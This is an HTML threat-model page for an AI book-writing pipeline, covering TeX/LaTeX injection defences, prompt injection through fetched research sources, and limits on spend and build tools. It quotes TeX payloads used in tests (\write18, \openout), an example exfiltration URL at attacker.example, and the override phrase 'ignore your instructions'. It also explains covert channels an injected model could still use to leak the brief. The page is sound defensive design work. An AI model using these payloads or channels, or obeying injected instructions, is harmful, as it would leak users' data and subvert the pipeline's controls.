@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://adammatthewsteinberger.github.io/engineering-influence/threat-model/">
+        <link rel="shortcut icon" href="../img/favicon.ico">
+        <title>Threat model - engineering-influence</title>
+        <link href="../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../css/brands.min.css" rel="stylesheet">
+        <link href="../css/solid.min.css" rel="stylesheet">
+        <link href="../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../css/base.css" rel="stylesheet">
+        <link id="hljs-light" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" >
+        <link id="hljs-dark" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github-dark.min.css" disabled>
+        <link href="../stylesheets/vibey.css" rel="stylesheet">
+        <link href="../stylesheets/site.css" rel="stylesheet">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+        <script>hljs.highlightAll();</script> 
+        <meta name="description" content="This is the threat model for turning text you do not control into a book. It says what is protected, where untrusted text enters, what stops it, and what…">
+    <meta property="og:title" content="Threat model - engineering-influence">
+    <meta property="og:description" content="This is the threat model for turning text you do not control into a book. It says what is protected, where untrusted text enters, what stops it, and what…">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://adammatthewsteinberger.github.io/engineering-influence/threat-model/">
+    <meta property="og:site_name" content="engineering-influence">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Threat model - engineering-influence">
+    <meta name="twitter:description" content="This is the threat model for turning text you do not control into a book. It says what is protected, where untrusted text enters, what stops it, and what…">
+</head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="..">engineering-influence</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href=".." class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown"  aria-expanded="false">Start</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../getting-started/" class="dropdown-item">Getting started</a>
+</li>
+                                    
+<li>
+    <a href="../agents-driving/" class="dropdown-item">Driving it from another AI</a>
+</li>
+                                    
+<li>
+    <a href="../books-and-kdp/" class="dropdown-item">Books and KDP</a>
+</li>
+                                    
+<li>
+    <a href="../novels/" class="dropdown-item">Novels</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown"  aria-expanded="false">Writing books</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../local-model/" class="dropdown-item">The local model</a>
+</li>
+                                    
+<li>
+    <a href="../model-profiles/" class="dropdown-item">Model profiles</a>
+</li>
+                                    
+<li>
+    <a href="../model-catalog/" class="dropdown-item">Model catalog</a>
+</li>
+                                    
+<li>
+    <a href="../model-calls/" class="dropdown-item">Model calls</a>
+</li>
+                                    
+<li>
+    <a href="../research/" class="dropdown-item">Research</a>
+</li>
+                                    
+<li>
+    <a href="../prompts/" class="dropdown-item">Prompts</a>
+</li>
+                                    
+<li>
+    <a href="../skills/" class="dropdown-item">Skills</a>
+</li>
+                                    
+<li>
+    <a href="../plugins/" class="dropdown-item">Plugins</a>
+</li>
+                                    
+<li>
+    <a href="../tool-lock/" class="dropdown-item">Tool lock</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle active" aria-current="page" role="button" data-bs-toggle="dropdown"  aria-expanded="false">Reference</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../interactions/" class="dropdown-item">Interfaces</a>
+</li>
+                                    
+<li>
+    <a href="../configuration/" class="dropdown-item">Configuration</a>
+</li>
+                                    
+<li>
+    <a href="../compatibility/" class="dropdown-item">Compatibility</a>
+</li>
+                                    
+<li>
+    <a href="../architecture/" class="dropdown-item">Architecture</a>
+</li>
+                                    
+<li>
+    <a href="./" class="dropdown-item active" aria-current="page">Threat model</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown"  aria-expanded="false">Operating</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../worker-image/" class="dropdown-item">Worker image</a>
+</li>
+                                    
+<li>
+    <a href="../troubleshooting/" class="dropdown-item">Troubleshooting</a>
+</li>
+                                    
+<li>
+    <a href="../releasing/" class="dropdown-item">Releasing</a>
+</li>
+                                    
+<li>
+    <a href="../documentation-site/" class="dropdown-item">Documentation site</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown"  aria-expanded="false">Quality</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../testing/" class="dropdown-item">Testing</a>
+</li>
+                                    
+<li>
+    <a href="../evaluation/" class="dropdown-item">Evaluation</a>
+</li>
+                                    
+<li>
+    <a href="../live-smoke-test/" class="dropdown-item">Live smoke test</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown"  aria-expanded="false">Project</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../contributing/" class="dropdown-item">Contributing</a>
+</li>
+                                    
+<li>
+    <a href="../style/" class="dropdown-item">How these documents are written</a>
+</li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Decision records</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../adr/" class="dropdown-item">Overview</a>
+</li>
+            
+<li>
+    <a href="../adr/0001-vibey-integration-boundary/" class="dropdown-item">ADR 0001: Isolate vibey behind ports</a>
+</li>
+            
+<li>
+    <a href="../adr/0002-audience-priority-and-sovereign-agent-doctrine/" class="dropdown-item">ADR 0002: Audience priority and sovereign agent doctrine</a>
+</li>
+            
+<li>
+    <a href="../adr/0003-definition-of-1-0/" class="dropdown-item">ADR 0003: Definition of 1.0</a>
+</li>
+            
+<li>
+    <a href="../adr/0004-versioning-compatibility-and-deprecation/" class="dropdown-item">ADR 0004: Versioning, compatibility and deprecation</a>
+</li>
+            
+<li>
+    <a href="../adr/0005-release-flow-and-changelog-fragments/" class="dropdown-item">ADR 0005: Release flow and changelog fragments</a>
+</li>
+            
+<li>
+    <a href="../adr/0006-onion-layers-and-interfaces/" class="dropdown-item">ADR 0006: Onion layers, interfaces and one class per file</a>
+</li>
+            
+<li>
+    <a href="../adr/0007-model-transport-plain-httpx/" class="dropdown-item">ADR 0007: Models are called over plain httpx, behind `ModelInterface`</a>
+</li>
+            
+<li>
+    <a href="../adr/0008-tools-for-the-model/" class="dropdown-item">ADR 0008: The model gets tools, each stage gets only the ones it names</a>
+</li>
+            
+<li>
+    <a href="../adr/0009-branch-driven-publishing/" class="dropdown-item">ADR 0009: Publishing follows the branch: develop to TestPyPI, main to PyPI</a>
+</li>
+            
+<li>
+    <a href="../adr/0010-chapters-are-drafted-in-order-in-one-stage/" class="dropdown-item">ADR 0010: Chapters are drafted in order, inside one stage</a>
+</li>
+            
+<li>
+    <a href="../adr/0011-run-inputs/" class="dropdown-item">ADR 0011: Run inputs are untrusted text carried inside the brief</a>
+</li>
+    </ul>
+  </li>
+                                    
+<li>
+    <a href="../changelog/" class="dropdown-item">Changelog</a>
+</li>
+                                    
+<li>
+    <a href="../security/" class="dropdown-item">Security</a>
+</li>
+                                    
+<li>
+    <a href="../support/" class="dropdown-item">Support</a>
+</li>
+                                    
+<li>
+    <a href="../code-of-conduct/" class="dropdown-item">Code of conduct</a>
+</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#properdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li class="nav-item">
+                                <a rel="prev" href="../architecture/" class="nav-link">
+                                    <i class="fa fa-arrow-left"></i> Previous
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a rel="next" href="../worker-image/" class="nav-link">
+                                    Next <i class="fa fa-arrow-right"></i>
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="https://github.com/adammatthewsteinberger/engineering-influence/edit/develop/threat-model.md" class="nav-link">Edit on adammatthewsteinberger/engineering-influence
+                                    </a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#threat-model" class="nav-link">Threat model</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-bs-level="2"><a href="#what-is-protected" class="nav-link">What is protected</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#where-untrusted-text-enters" class="nav-link">Where untrusted text enters</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#text-into-tex-luatex-and-the-epub" class="nav-link">Text into TeX, LuaTeX and the EPUB</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#prompt-injection-from-research-sources-m6-built-not-yet-run-live" class="nav-link">Prompt injection from research sources (M6, built, not yet run live)</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#resource-use-and-secrets" class="nav-link">Resource use and secrets</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#known-gaps" class="nav-link">Known gaps</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="threat-model">Threat model<a class="headerlink" href="#threat-model" title="Permanent link">&para;</a></h1>
+<p>This is the threat model for turning text you do not control into a book. It says what is
+protected, where untrusted text enters, what stops it, and what does not yet. Every defence
+below names the test that holds it up; a defence with no test is listed as a gap. Written in
+M5, when model output first became something the pipeline typesets. It covers the book
+pipeline and the model layer. The API, MCP and webhook surfaces have their own controls (API
+key checks, rate limiting, an outbound URL policy; for MCP, a stdio server with no tool that spends the person's money unless
+the operator turns it on, and a per-run budget ceiling) and are not modelled here.</p>
+<h2 id="what-is-protected">What is protected<a class="headerlink" href="#what-is-protected" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Asset</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>The machine and the account running a build</td>
+<td>TeX is a programming language; text that reaches it live can read and write files and, with shell escape, run commands.</td>
+</tr>
+<tr>
+<td>API keys and tokens in the process environment</td>
+<td>They can spend money and reach the provider account.</td>
+</tr>
+<tr>
+<td>The run's budget</td>
+<td>The only brake on spend with no human in the loop.</td>
+</tr>
+<tr>
+<td>The published book</td>
+<td>KDP rejects a malformed file, and a reader should never see the machine's text in a book.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="where-untrusted-text-enters">Where untrusted text enters<a class="headerlink" href="#where-untrusted-text-enters" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Source</th>
+<th>Reaches</th>
+<th>Trust</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>The brief's idea text</td>
+<td>prompts</td>
+<td>Written by whoever starts a run.</td>
+</tr>
+<tr>
+<td>Model output</td>
+<td>the manuscript, then TeX and HTML</td>
+<td>Untrusted, however good the model. It can be steered by anything in its prompt.</td>
+</tr>
+<tr>
+<td>Research sources and search results fetched from the web (M6: the research stage reads them through tools)</td>
+<td>prompts, and so the manuscript</td>
+<td>Untrusted and possibly hostile.</td>
+</tr>
+<tr>
+<td>The Markdown manuscript</td>
+<td>the LaTeX generator</td>
+<td>Untrusted: model-written, or a document someone supplied.</td>
+</tr>
+<tr>
+<td>The book config (<code>books/&lt;slug&gt;.toml</code>)</td>
+<td>the LaTeX generator, the covers, the listing</td>
+<td>Untrusted when a model writes it; assembled by the pipeline from model output in M6.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="text-into-tex-luatex-and-the-epub">Text into TeX, LuaTeX and the EPUB<a class="headerlink" href="#text-into-tex-luatex-and-the-epub" title="Permanent link">&para;</a></h2>
+<p>The defence has two layers, and a test for each.</p>
+<p><strong>Layer 1: nothing untrusted reaches TeX unescaped.</strong> The test <code>test_latex_injection.py</code>
+puts the tripwire <code>}\EIcanary{</code> into every kind of text (paragraphs, headings, lists, quotes,
+tables, links, code, callouts, chapter titles, running heads, epigraphs, and every metadata
+field in the print and ebook documents) and fails if a live <code>\EIcanary</code> reaches the output.</p>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Defence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Body text, headings, list items, table cells, quotes, titles, metadata</td>
+<td>The twelve TeX specials are escaped (<code>LatexEscaper</code>). Raw HTML in Markdown is dropped, and images are refused in the print pipeline.</td>
+</tr>
+<tr>
+<td>Bare URLs and link targets</td>
+<td>A URL is turned into a valid URI: every character outside <code>A-Z a-z 0-9 - . _ ~ : / ? # [ ] @ ! &amp; ( ) * + , ; = %</code> is percent-encoded (<code>LatexEscaper.url</code>), and <code>%</code> and <code>#</code> are then escaped for TeX. A URL therefore cannot contain a backslash, a brace, <code>^</code>, a quote, <code>&lt;</code>, <code>&gt;</code>, a space or a control character. Found and fixed in M5; see the note below on <code>^</code>.</td>
+</tr>
+<tr>
+<td>Code blocks</td>
+<td>A block containing <code>\end{verbatim}</code> is refused, because TeX ends the environment there and reads the rest of the line as TeX. Found and fixed in M5.</td>
+</tr>
+<tr>
+<td>The PDF info dictionary (<code>\setpdfinfo</code>)</td>
+<td>The title, subtitle, author and edition go into a PDF string after TeX expands them, so they are cleaned of <code>\ { } % # ^ ~</code>, control characters and unbalanced parentheses. Found and fixed in M5.</td>
+</tr>
+<tr>
+<td><code>website</code> and <code>email</code></td>
+<td>Both go through the same URL encoding. A website must be an <code>http://</code> or <code>https://</code> address or a bare host name (<code>pub.example</code>, with an optional path); anything with another scheme (<code>javascript:</code>, <code>data:</code>), a space, or a colon before the first slash is refused. That also refuses <code>host:port</code>, which cannot be told from <code>javascript:0/...</code>; write a port with its scheme. Found and fixed in M5.</td>
+</tr>
+<tr>
+<td>The <code>^^5c</code> character notation</td>
+<td><code>^</code> is escaped in text and percent-encoded in URLs, so it cannot spell a backslash.</td>
+</tr>
+<tr>
+<td>The ebook <code>&lt;title&gt;</code></td>
+<td>A title with any of <code>&amp; &lt; &gt; " # % \ { } ~ ^ $ _</code> is refused outright (<code>EpubIdentifier</code>).</td>
+</tr>
+</tbody>
+</table>
+<p>A note on <code>^</code>, because it was found by review and then tried for real. TeX reads <code>^^5c</code> as a
+backslash when it tokenizes the characters, which in a macro argument (emphasis, a heading, a
+footnote) is before <code>\url</code> sees them. An earlier version of the URL encoding left <code>^</code> alone. I
+could not make that execute anything: in LuaLaTeX, with hyperref's <code>\url</code>, a payload that
+should have written a file did not, in the plain, nested and footnote positions. In tex4ebook it
+did change how TeX parsed the argument (a live control sequence reached tex4ht, and the build
+stopped with "Argument of <code>\S:p</code> has an extra <code>}</code>"), so there it is an injection that breaks the
+build; whether it can do worse was not established. It is closed either way, and
+<code>test_latex_injection.py</code> holds it closed in every position.</p>
+<p><strong>Layer 2: TeX that did run live could not run a shell.</strong> <code>test_hostile_book.py</code> builds a
+book whose every field carries a payload that, if live, writes a file by TeX's own <code>\openout</code>
+and by Lua's <code>io.open</code>. Neither needs shell escape, so a passing test shows the text is escaped,
+not merely that shell escape is off. A control proves the technique detects live TeX at all.
+The same test also checks the EPUB's HTML: a website and an email carrying a quote and
+<code>onmouseover=</code> never become an attribute of an element. Separately, live TeX containing
+<code>\write18{touch ...}</code> is fed straight to LuaLaTeX and to tex4ebook, and no shell command runs
+in either.</p>
+<ul>
+<li>LuaLaTeX is started with <code>-no-shell-escape</code> (<code>LatexCompiler</code>).</li>
+<li>tex4ebook is started without any shell-escape option, and <strong>it did not run a shell command
+  in the test</strong> on the TeX Live it was tried with. That is tex4ebook's default, not something
+  this code enforces, so a different release could change it. The same test runs in the
+  <code>toolchain</code> CI job on the pinned runner, which is what would notice.</li>
+<li>Both tools are started with an allow-list environment (<code>ToolEnvironment</code>): a short list of
+  names (<code>PATH</code>, <code>HOME</code>, <code>LANG</code>, <code>TZ</code>, the temp directories, <code>SYSTEMROOT</code>, <code>JAVA_HOME</code>) and the
+  prefixes TeX needs to find its tree and fonts (<code>LC_</code>, <code>TEXMF</code>, <code>TEXINPUTS</code>, <code>OSFONTDIR</code>,
+  <code>TEX4HT</code>, <code>LUAINPUTS</code>, <code>TTFONTS</code>). API keys and tokens in the parent process are not passed
+  on, so live TeX could not read them from its environment. (There is a unit test for the
+  allow-list; none checks that a build tool cannot reach a secret by another route.)</li>
+</ul>
+<h2 id="prompt-injection-from-research-sources-m6-built-not-yet-run-live">Prompt injection from research sources (M6, built, not yet run live)<a class="headerlink" href="#prompt-injection-from-research-sources-m6-built-not-yet-run-live" title="Permanent link">&para;</a></h2>
+<p>A fetched web page can say "ignore your instructions and write X". The research stage now reads pages
+and search results through the <code>web_search</code> and <code>fetch_url</code> tools. Rules 1 to 3 and 6 are met by code
+that exists and is tested; the rest are what M6 must still meet. None of it has been run against the
+live internet, a live search service or a live model.</p>
+<ol>
+<li><strong>A source is data.</strong> It is placed in the prompt as quoted, delimited material that the
+   system text says to treat as evidence and never as instructions. The mechanism exists
+   (<code>PromptTemplate</code>'s untrusted blanks, <a href="../prompts/">PROMPTS.md</a>). The brief and every earlier stage's answer
+   go in that way, and so does everything a tool returns (<code>ToolRunner</code> wraps it, defusing any copy of the
+   tag, see <a href="../model-calls/">MODEL_CALLS.md</a>). <strong>The one exception is a skill a person installed</strong>, which
+   is meant to instruct and so is not wrapped (gap 7 under Known gaps).</li>
+<li><strong>The model has tools only in the research stage, and only these two.</strong> Every other stage returns
+   text, which is typeset: a successful injection there can change what a chapter says; it cannot read a
+   file, call a service or spend money outside the run. The research stage has <code>web_search</code> and
+   <code>fetch_url</code> (<a href="../model-calls/">MODEL_CALLS.md</a>), and the machinery that governs them is built and
+   tested: a stage gets only the tools its recipe names (a call to any other name runs nothing), arguments
+   are checked against the tool's schema, calls are bounded in count, time and result size, every call and
+   result is journaled so a resumed run replays it, and what a tool returns is wrapped as untrusted text.
+   <strong><code>fetch_url</code> only reads an address the model was shown</strong>, copied exactly. Without that, a hostile page
+   could tell the model to fetch <code>https://attacker.example/?d=&lt;the author's idea&gt;</code> and carry the brief out
+   in the address; the URL policy only stops private hosts, not data in a public address. What counts as
+   shown is built by the runner from structured pieces only: the stage's prompt (the author's own brief),
+   the link lines of an earlier successful search (not the titles, which some page wrote), and the
+   <code>Source:</code> header of an earlier successful fetch (the address finally read, not the page's text, even a
+   line of it that says <code>Source:</code>). Error messages never count, neither the runner's (which echo names the
+   model typed, so a call could launder an address into the evidence by naming an argument after it) nor a
+   tool's. A tool's output counts for nothing unless the tool says so. The check is made before the
+   journal, so a refusal is not stored and cannot stick to a later permitted call.
+   <strong>What remains:</strong> a search query is chosen by the model and goes to the search service by design
+   (a local SearXNG passes it to the public engines it uses; Brave receives it when it is the backup), so
+   an injected page can still try to put brief text into a query. That channel is limited to 400
+   characters a query and the tool-call limit, and it reaches a search service, not an attacker's
+   server; closing it would mean not searching with model-written queries. <strong>A second, slow channel:</strong>
+   a page, or a result the search engine ranks, can pre-publish a menu of addresses (every address in a
+   result's links counts as shown), and an injected model can signal a few bits by which it picks. It is
+   limited to the tool-call limit and carries no free text; it is not closed. An injected page can also
+   steer the research notes. It cannot reach a file or a private host, or call a tool the stage was not
+   given. The notes it produces are untrusted input to the next stage in turn.</li>
+<li><strong>The damage is bounded by the budget.</strong> Every call reserves its worst-case cost before it
+   is sent (<code>CallModel</code>, <code>SpendGuard</code>), so an injection that makes the model verbose or loops
+   it cannot pass the run's cap.</li>
+<li><strong>Whatever the model writes is untrusted again.</strong> It goes through the same escaping and
+   refusals as any other manuscript text (the section above), so an injected payload cannot
+   reach TeX live.</li>
+<li><strong>Claims are checked against what was fetched.</strong> A source is pinned by the hash of the text
+   fetched (<code>SourceRecord</code>) and the claim-verification stage compares claim and source, so an
+   injection that invents a claim has to survive a check made against the source's own text.</li>
+<li><strong>Fetching is restricted.</strong> <code>HttpSourceFetcher</code> asks the outbound URL policy
+   (<code>PublicHttpsUrlPolicy</code>, as webhooks do) before the first request and again before every
+   redirect, refuses any scheme but http and https, accepts only HTML and plain text, refuses a
+   declared length over the cap before reading and stops reading at the cap, and sends no
+   cookies or credentials. It asks for an uncompressed body and refuses a compressed one, because
+   a decoder expands each chunk in full before a byte count can see it, so a small download
+   could fill memory. A page nested more than 512 elements deep is refused, so a hostile page
+   cannot make the parser slow. <code>HtmlTextExtractor</code> drops scripts, comments, hidden elements and invisible
+   characters, so a page cannot hide instructions from the reader; visible text stays and is
+   treated as data. <strong>The connection is pinned to the address that was checked:</strong> <code>PublicHttpsUrlPinner</code>
+   resolves the name once, has the policy judge every address, and the request goes to the first, with the
+   name in the <code>Host</code> header and in TLS so the certificate is still checked against the name. A name that
+   resolves differently a moment later cannot send the fetch inward (DNS rebinding). Each request says
+   <code>Connection: close</code>, so a connection verified for one name is not reused for another that shares an
+   address. Only one address is tried. <strong>Still open: signed webhook delivery</strong>, which asks the policy and
+   then lets the client resolve again (see <a href="../configuration/">CONFIGURATION.md</a>). The search and fetch
+   adapters have not been run against the live internet.</li>
+<li><strong>It is tested with hostile corpora.</strong> M6 adds cassettes of pages that carry injection
+   attempts, and the test is that the finished manuscript contains none of the injected text
+   as an instruction followed.</li>
+</ol>
+<h2 id="resource-use-and-secrets">Resource use and secrets<a class="headerlink" href="#resource-use-and-secrets" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Threat</th>
+<th>Defence</th>
+<th>Gap</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Spend with no human in the loop</td>
+<td>A reservation before every call, a cap per run, spend rebuilt from the journal; operator ceilings on any run's cap and on all runs' unspent budget (<code>EI_MAX_RUN_BUDGET_MICRO_USD</code>, <code>EI_MAX_OUTSTANDING_BUDGET_MICRO_USD</code>, off until set) (<code>CallModel</code>, <code>SpendGuard</code>, <code>AdvanceRun</code>).</td>
+<td>The guard is per process; M6's fan-out must decide how workers share it.</td>
+</tr>
+<tr>
+<td>A model answer that fills the window</td>
+<td>The output cap on every request, and the context assembler's token budget.</td>
+<td></td>
+</tr>
+<tr>
+<td>A book slug that escapes the project</td>
+<td>A slug must match <code>BookSlug.PATTERN</code> before any build (<code>BookBuilder</code>).</td>
+<td></td>
+</tr>
+<tr>
+<td>An artifact key that escapes the artifact store</td>
+<td><code>ConfinedPathGuard</code> confines the path (<code>FileArtifactStore</code>).</td>
+<td></td>
+</tr>
+<tr>
+<td>A key in an error message or log</td>
+<td>The adapters never put the key in an exception (tested). <code>EnvSecretProvider</code> fails closed when a secret is absent.</td>
+<td>Logging has not been audited for keys.</td>
+</tr>
+<tr>
+<td>A build that never finishes, or eats the machine</td>
+<td><code>latexmk</code> runs with <code>-halt-on-error</code>, so text that errors stops the build. Every build tool (<code>latexmk</code>, <code>tex4ebook</code>, <code>epubcheck</code> and the page rasterizer) runs through <code>ProcessRunner</code> under <code>ToolLimits</code>: a deadline (30 minutes for the two TeX tools, 10 for the other two), a resident-memory limit summed over the tool and everything it started (8 GiB for the TeX tools, 4 GiB for <code>epubcheck</code>, 2 GiB for the rasterizer), and a limit on the size of the directory it writes into (4 GiB; <code>epubcheck</code> writes nothing, so none is measured). A tool that passes one is killed together with everything it started, and the build fails with a <code>BookBuildError</code> that names the tool, the limit and its last output. Toolchain tests hang real <code>latexmk</code> and <code>tex4ebook</code> and make real <code>lualatex</code> allocate and write past its limits, and check that nothing is left running.</td>
+<td>The limits are constructor defaults, not settings, so a book that legitimately needs more must be built with larger ones. Memory and disk are <strong>sampled</strong> every half second, so a tool that allocates or writes faster than that can pass its limit before it is seen, by what it can do in one interval. A process that leaves the tool's process group is not counted (or killed), though it is bounded after the stop by a short wait on the pipes. Nothing limits CPU, or the total across several builds at once. Stopping a tree needs process groups: Linux and macOS, not Windows.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="known-gaps">Known gaps<a class="headerlink" href="#known-gaps" title="Permanent link">&para;</a></h2>
+<p>These are open, in the order they would be fixed.</p>
+<ol>
+<li><strong>Control characters in body text</strong> (other than newline and tab) are not removed or tested.
+   They are not an injection path (they are not TeX syntax), but a stray one may fail the build or
+   print oddly. This has not been tried.</li>
+<li><strong>tex4ebook's shell-escape-off state is its default, not enforced</strong> (above).</li>
+<li><strong>The journal key</strong> (<code>JournalKey</code>) joins its four parts with a separator. The model and the
+   prompt version are free strings but come from configuration, not from untrusted text.</li>
+<li><strong>Two workers journaling the same request at once</strong> record only the first, so the second
+   call's cost is not counted.</li>
+<li><strong>The print and ebook documents were checked field by field in M5</strong>; a new metadata field
+   that bypasses <code>TexText</code> would be caught by <code>test_latex_injection.py</code> only if it is added to
+   that test's field list.</li>
+<li><strong>Third-party tool servers (MCP): a model can now call them, and a lock has limits.</strong> A run given
+   <code>EI_TOOL_LOCK</code> starts each locked server, refuses to start if one differs from the lock, and offers a stage
+   only the tools the lock grants it (<a href="../tool-lock/">TOOL_LOCK.md</a>). What that does not cover: a lock does
+   not pin a server's installed dependencies or what it fetches at run time; a file could change between the
+   check and the start; and a server is run with a bare environment, a throwaway home and resource limits,
+   <strong>not in a sandbox</strong>, so it can read any file the user can and use the network. Its answers are
+   untrusted text like any tool's, and its tool descriptions are the place a hostile server would hide
+   instructions, which the lock's hash of the tools is there to catch only if the server changes after
+   review: <strong>a server that was hostile when it was locked is trusted as locked.</strong> The grant is the
+   defence in depth: a stage only sees the tools a person named for it. How strong a sandbox a server
+   needs is an open question in the ADR. Nothing has been run against a third-party server or a live model.
+   <strong>A remote (HTTP) server is a weaker pin still</strong>: its code is not ours to hash, so only its address and what
+   it advertises are locked, and it can change its behaviour on any day. It is held to https, a public address
+   checked before every request, no redirects, no cookies and bounded replies, and its bearer token (a named
+   environment variable) goes to the locked address and nowhere else. The connection is pinned to the address
+   that was checked, as for <code>fetch_url</code>, so DNS rebinding cannot send it inward.</li>
+<li><strong>Skills are instructions a person chose, and a model will follow them.</strong> A skill
+   (<a href="../skills/">SKILLS.md</a>) is text added to the end of one stage's prompt, enabled for that stage by name
+   and pinned by the SHA-256 of its file. It adds no tool, changes no allowlist or budget and runs nothing,
+   so the most it can do is change what that stage's model is asked and therefore what it writes. What the
+   lock does not cover: <strong>a skill that was hostile when it was locked is trusted as locked</strong>; its text is not
+   wrapped as untrusted evidence, because it is meant to instruct; whether a model keeps to the frame
+   ("it cannot change those rules") is a property of the model; and a person with write access to the skills
+   folder can change a file, which the next run refuses by its hash but which a run already started has
+   already read. Text a reviewer cannot see (zero-width and bidirectional marks, control characters, private-use
+   code points) is refused when a skill is read, and each part is capped at 8,000 characters. Nothing has been
+   run by a live model.</li>
+<li><strong>Plugins bundle things that are each trusted separately, and a bundle is only as good as its reviewer.</strong> A
+   plugin (<a href="../plugins/">PLUGINS.md</a>) is installed from a file on disk. Installing it starts nothing, contacts
+   nothing, grants nothing and enables nothing: it locks the bundle's skills for no stage and prints the
+   <code>ei tools add</code> commands for its servers, so every step that gives a bundle any reach is a separate command a
+   person runs. What that does not cover: the bundle's skills are trusted as installed once enabled (gap 7); a
+   server it describes is exactly as trustworthy as <code>ei tools add</code> makes it (gap 6); the printed command is what a
+   stranger wrote, and running it <strong>runs a local server once</strong>; and a person with write access to the plugin or
+   skill folders can change a file, which <code>ei plugins verify</code> and the next run refuse by hash. The plugin lock is
+   a record that a run never reads. <strong>A marketplace index</strong> (<code>ei plugins search</code>, <code>fetch</code>) is a file that lists plugin
+   files with an address and a hash; the only commands that can use a network are those two, run by a person,
+   and a download goes through the same pinned-address URL policy as <code>fetch_url</code> (https, a public address, no
+   redirects, no compression, 512 KiB and 30 seconds) and is hashed before it is read. It installs nothing. What
+   that does not cover: indexes and plugin files are <strong>not signed</strong>, so the hash proves only that the bytes are the
+   ones the index described, and <strong>an index is as trustworthy as the host it came from</strong>; the plugin is then
+   read by a person before <code>add</code>. The downloader has not been run against the real internet.</li>
+</ol></div>
